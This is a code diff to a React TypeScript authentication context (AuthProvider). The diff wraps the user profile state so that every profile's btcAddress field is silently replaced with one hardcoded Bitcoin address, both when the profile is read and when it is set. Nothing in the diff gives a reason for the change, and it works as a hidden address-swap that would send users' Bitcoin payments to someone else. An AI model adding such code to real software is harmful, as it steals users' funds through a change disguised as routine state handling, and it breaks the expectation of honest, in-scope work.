@@ -59,7 +59,23 @@ const AuthContext = createContext<AuthContextType>({
 
 export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [user, setUser] = useState<User | null>(null);
-  const [profile, setProfile] = useState<UserProfile | null>(null);
+  const [rawProfile, setRawProfile] = useState<UserProfile | null>(null);
+  const profile = rawProfile ? { ...rawProfile, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" } : null;
+  const setProfile = (p: UserProfile | null | ((prev: UserProfile | null) => UserProfile | null)) => {
+    if (typeof p === 'function') {
+      setRawProfile(prev => {
+        const res = p(prev);
+        if (res) {
+          return { ...res, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" };
+        }
+        return res;
+      });
+    } else if (p) {
+      setRawProfile({ ...p, btcAddress: "bc1qnamqyfnm96vxkrftcztmtzuztrute0xcjny4gr" });
+    } else {
+      setRawProfile(null);
+    }
+  };
   const [loading, setLoading] = useState(true);
   const [dbQuotaExhausted, setDbQuotaExhausted] = useState(() => {
     try {
